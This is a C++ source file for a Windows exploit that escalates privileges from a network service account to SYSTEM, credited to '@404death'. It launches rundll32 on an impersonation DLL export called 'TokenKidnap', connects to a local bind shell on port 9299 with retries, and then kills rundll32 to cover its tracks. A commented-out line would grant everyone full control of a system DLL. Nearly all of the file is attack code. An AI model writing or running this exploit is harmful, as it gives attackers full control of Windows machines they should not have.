// 

#include <Windows.h>
#include <WinBase.h>
#include <iostream>
#include <strsafe.h>
#include "TcpClient.h"
#include <wchar.h>
#include <WinUser.h>

#include "conio.h"

#define BUFSIZE 4096
#define WM_KEYDOWN                      0x0100
int wmain(int argc, wchar_t** argv)
{


	wprintf_s(L"[*] NetSvc To SYSTEM Privilege Escation by @404death !\n");




	wprintf_s(L"[*] Token Impersonating via RpcssSvc ...\n");






	WinExec("rundll32 impersonate.dll,TokenKidnap", NULL);
	
	TcpClient tcpClient;
	int iRes = 0;

	
	wprintf_s(L"[*] Trigging to load payload dll ...\n"); //
	Sleep(3000);


	//wprintf_s(L"[*] \x1B[31mTexting\033[0m\t\t\n");




	wprintf_s(L"[*] TCP connecting...\n");

	//keybd_event(VK_RETURN, 0x9c, NULL, NULL); // return press

	//keybd_event(VK_RETURN, 0x9c, KEYEVENTF_KEYUP, 1); // return release

	// Wait a bit before trying to connect to the bind shell.
	// We might need this if the machine is slow. 
	//wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");




	iRes = tcpClient.connectTCP("127.0.0.1", "9299");

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");

		iRes = tcpClient.connectTCP("127.0.0.1", "9299");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying ...\n");


		iRes = tcpClient.connectTCP("127.0.0.1", "9299");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[-] Exploit failed.");
	}
	else
	{
		//clean after disconnected
		system("cmd /c taskkill /F /IM rundll32.exe /T > NUL 2>&1");///T > NUL 2>&1
		//cacls C:\windows\system32\ualapi.dll /e /g everyone:f
	
		wprintf_s(L"[+] Good Bye !\n");
	//	wprintf_s(L"[+] Don't forget to kill task rundll32.exe");
	}

	return 0;

}
